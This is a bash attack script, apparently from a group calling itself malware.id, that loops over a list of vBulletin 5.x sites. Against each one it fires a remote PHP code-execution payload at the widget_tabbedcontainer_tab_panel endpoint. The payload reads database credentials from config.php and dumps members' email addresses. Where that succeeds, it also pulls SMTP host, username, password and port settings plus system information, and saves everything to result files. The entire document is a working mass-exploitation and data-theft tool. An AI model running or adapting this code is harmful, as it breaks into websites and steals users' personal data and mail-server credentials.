timeout=15   # 10 seconds
echo -en "\e[36;1m"
cat << "EOF"
        _--_                                     _--_
      /#()# #\         0             0         /# #()#\
      |()##  \#\_       \           /       _/#/  ##()|
      |#()##-=###\_      \         /      _/###=-##()#|
       \#()#-=##  #\_     \       /     _/#  ##=-#()#/
        |#()#--==### \_    \     /    _/ ###==--#()#|
        |#()##--=#    #\_   \!!!/   _/#    #=--##()#|
         \#()##---===####\   O|O   /####===---##()#/
          |#()#____==#####\ / Y \ /#####==____#()#|
           \###______######|\/#\/|######______###/
              ()#O#/      ##\_#_/##      \#O#()
             ()#O#(__-===###/ _ \###===-__)#O#()
            ()#O#(   #  ###_(_|_)_###  #   )#O#()
            ()#O(---#__###/ (_|_) \###__#---)O#()
            ()#O#( / / ##/  (_|_)  \## \ \ )#O#()
            ()##O#\_/  #/   (_|_)   \#  \_/#O##()
             \)##OO#\ -)    (_|_)    (- /#OO##(/
              )//##OOO*|    / | \    |*OOO##\\(
              |/_####_/    ( /X\ )    \_####_\|
             /X/ \__/       \___/       \__/ \X\
            (#/                               \#)

    contact : 
    fb.com/malware.id
    malware@jca-team.or.id

EOF
echo -e "\e[33m=== SMTP & Email Dumper Vbulletin v5.x ===\n\e[39m" 
if [ -z "$1" ];
  then
    echo -en "\e[31;2m Usage : ./vb-email-smtp.sh list.txt\n\e[39m"
  exit 1
fi
while read URL;
do
  URL=${URL%$'\r'}
  echo -e "\e[31m$URL" 
  echo -en "\e[39m" 
  (curl -s "$URL/ajax/render/widget_tabbedcontainer_tab_panel" -d 'subWidgets[0][template]=widget_php&subWidgets[0][config][code]=$he='mysql';$user="$(cat core/includes/config.php|grep%20-E%20%27MasterServer%27|grep%20-v%20%27Example%27|grep%20-v%20%27Default%27|grep%20-v%20%27servername%27|grep%20-v%20%27port%27|grep%20-v%20%27usepconnect%27|grep%20-v%20%27password%27|grep%20-v%20%27|%27|%20cut%20-d%20\%27%20-f%206)";$password="$(cat core/includes/config.php|grep%20-E%20%27MasterServer%27|grep%20-v%20%27Example%27|grep%20-v%20%27Default%27|grep%20-v%20%27servername%27|grep%20-v%20%27port%27|grep%20-v%20%27usepconnect%27|grep%20-v%20%27username%27|grep%20-v%20%27|%27|%20cut%20-d%20\%27%20-f%206)";$dbname="$(cat core/includes/config.php|grep%20-E%20%27Database%27|grep%20-v%20%27dbtype%27|grep%20-v%20%27tableprefix%27|grep%20-v%20%27technicalemail%27|grep%20-v%20%27|%27|%20cut%20-d%20\%27%20-f%206)";$tbprefix="$(cat core/includes/config.php|grep%20-E%20%27Database%27|grep%20-v%20%27dbtype%27|grep%20-v%20%27dbname%27|grep%20-v%20%27technicalemail%27|grep%20-v%20%27|%27|%20cut%20-d%20\%27%20-f%206)user";echo%20shell_exec("$he -u $user -p$password<<MY_QUERY\nUSE $dbname \nselect email from $tbprefix\nMY_QUERY"); exit; ' | grep -v "varname" | egrep -i "@gmail.com|@yahoo.com|@hotmail.com|@aol.com|@hotmail.co.uk|@hotmail.fr|@msn.com|@yahoo.fr|@wanadoo.fr|@orange.fr|@comcast.net|@yahoo.co.uk|@yahoo.com.br|@yahoo.co.in|@live.com|@rediffmail.com|@free.fr|@gmx.de|@web.de|@yandex.ru|@ymail.com|@libero.it|@outlook.com|@uol.com.br|@bol.com.br|@mail.ru|@cox.net|@hotmail.it|@sbcglobal.net|@sfr.fr|@live.fr|@verizon.net|@live.co.uk|@googlemail.com|@yahoo.es|@ig.com.br|@live.nl|@bigpond.com|@terra.com.br|@yahoo.it|@neuf.fr|@yahoo.de|@alice.it|@rocketmail.com|@att.net|@laposte.net|@facebook.com|@bellsouth.net|@yahoo.in|@hotmail.es|@charter.net|@yahoo.ca|@yahoo.com.au|@rambler.ru|@hotmail.de|@tiscali.it|@shaw.ca|@yahoo.co.jp|@sky.com|@earthlink.net|@optonline.net|@freenet.de|@t-online.de|@aliceadsl.fr|@virgilio.it|@home.nl|@qq.com|@telenet.be|@me.com|@yahoo.com.ar|@tiscali.co.uk|@yahoo.com.mx|@voila.fr|@gmx.net|@mail.com|@planet.nl|@tin.it|@live.it|@ntlworld.com|@arcor.de|@yahoo.co.id|@frontiernet.net|@hetnet.nl|@live.com.au|@yahoo.com.sg|@zonnet.nl|@club-internet.fr|@juno.com|@optusnet.com.au|@blueyonder.co.uk|@bluewin.ch|@skynet.be|@sympatico.ca|@windstream.net|@mac.com|@centurytel.net|@chello.nl|@live.ca|@aim.com|@bigpond.net.au" > haha) & command_pid=$! 
  (sleep $timeout & wait; kill $command_pid 2>/dev/null) &  sleep_pid=$! 
  wait $command_pid 2>/dev/null
  kill $sleep_pid 2>/dev/null # If command completes prior to the timeout
  echo -en "\e[32m"
  if egrep -i "@gmail.com|@yahoo.com|@hotmail.com|@aol.com|@hotmail.co.uk|@hotmail.fr|@msn.com|@yahoo.fr|@wanadoo.fr|@orange.fr|@comcast.net|@yahoo.co.uk|@yahoo.com.br|@yahoo.co.in|@live.com|@rediffmail.com|@free.fr|@gmx.de|@web.de|@yandex.ru|@ymail.com|@libero.it|@outlook.com|@uol.com.br|@bol.com.br|@mail.ru|@cox.net|@hotmail.it|@sbcglobal.net|@sfr.fr|@live.fr|@verizon.net|@live.co.uk|@googlemail.com|@yahoo.es|@ig.com.br|@live.nl|@bigpond.com|@terra.com.br|@yahoo.it|@neuf.fr|@yahoo.de|@alice.it|@rocketmail.com|@att.net|@laposte.net|@facebook.com|@bellsouth.net|@yahoo.in|@hotmail.es|@charter.net|@yahoo.ca|@yahoo.com.au|@rambler.ru|@hotmail.de|@tiscali.it|@shaw.ca|@yahoo.co.jp|@sky.com|@earthlink.net|@optonline.net|@freenet.de|@t-online.de|@aliceadsl.fr|@virgilio.it|@home.nl|@qq.com|@telenet.be|@me.com|@yahoo.com.ar|@tiscali.co.uk|@yahoo.com.mx|@voila.fr|@gmx.net|@mail.com|@planet.nl|@tin.it|@live.it|@ntlworld.com|@arcor.de|@yahoo.co.id|@frontiernet.net|@hetnet.nl|@live.com.au|@yahoo.com.sg|@zonnet.nl|@club-internet.fr|@juno.com|@optusnet.com.au|@blueyonder.co.uk|@bluewin.ch|@skynet.be|@sympatico.ca|@windstream.net|@mac.com|@centurytel.net|@chello.nl|@live.ca|@aim.com|@bigpond.net.au" haha 
    then
      echo -en "\e[39m" 
      echo -e "$URL\n$(cat haha)\n" >> result-email.txt
      (curl -s "$URL/ajax/render/widget_tabbedcontainer_tab_panel" -d 'subWidgets[0][template]=widget_php&subWidgets[0][config][code]=$he='mysql';$user="$(cat core/includes/config.php|grep%20-E%20%27MasterServer%27|grep%20-v%20%27Example%27|grep%20-v%20%27Default%27|grep%20-v%20%27servername%27|grep%20-v%20%27port%27|grep%20-v%20%27usepconnect%27|grep%20-v%20%27password%27|grep%20-v%20%27|%27|%20cut%20-d%20\%27%20-f%206)";$password="$(cat core/includes/config.php|grep%20-E%20%27MasterServer%27|grep%20-v%20%27Example%27|grep%20-v%20%27Default%27|grep%20-v%20%27servername%27|grep%20-v%20%27port%27|grep%20-v%20%27usepconnect%27|grep%20-v%20%27username%27|grep%20-v%20%27|%27|%20cut%20-d%20\%27%20-f%206)";$dbname="$(cat core/includes/config.php|grep%20-E%20%27Database%27|grep%20-v%20%27dbtype%27|grep%20-v%20%27tableprefix%27|grep%20-v%20%27technicalemail%27|grep%20-v%20%27|%27|%20cut%20-d%20\%27%20-f%206)";$tbprefix="$(cat core/includes/config.php|grep%20-E%20%27Database%27|grep%20-v%20%27dbtype%27|grep%20-v%20%27dbname%27|grep%20-v%20%27technicalemail%27|grep%20-v%20%27|%27|%20cut%20-d%20\%27%20-f%206)setting";echo%20shell_exec("$he -u $user -p$password<<MY_QUERY\nUSE $dbname \nselect varname,value from $tbprefix where varname IN (\"smtp_host\",\"smtp_user\",\"smtp_pass\",\"smtp_port\",\"smtp_tls\")\nMY_QUERY");echo%20shell_exec("uname -a"); exit; ' | grep -v "varname" | grep -v "<" | egrep -i "smtp|linux" > haha) & command_pid=$! 
      (sleep $timeout & wait; kill $command_pid 2>/dev/null) &  sleep_pid=$! 
      wait $command_pid 2>/dev/null
      kill $sleep_pid 2>/dev/null # If command completes prior to the timeout
      echo -en "\e[32m"
      if egrep -i "smtp|linux" haha 
        then
          echo -en "\e[39m" 
          echo -e "$URL\n$(cat haha)\n" >> result-smtp.txt
      fi
    continue 2
  fi
done < $1 2>/dev/null
